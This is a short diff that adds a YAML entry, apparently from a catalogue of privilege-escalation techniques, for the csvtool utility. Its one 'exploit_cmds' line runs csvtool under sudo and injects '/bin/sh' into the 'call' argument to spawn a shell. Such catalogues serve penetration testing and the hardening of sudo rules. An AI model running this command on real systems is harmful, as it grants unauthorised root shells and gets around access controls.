@@ -1,0 +1,4 @@
+name: csvtool
+binary_path: /usr/bin/csvtool
+exploit_cmds:
+- sudo /usr/bin/csvtool call '/bin/sh;false' /etc/hosts
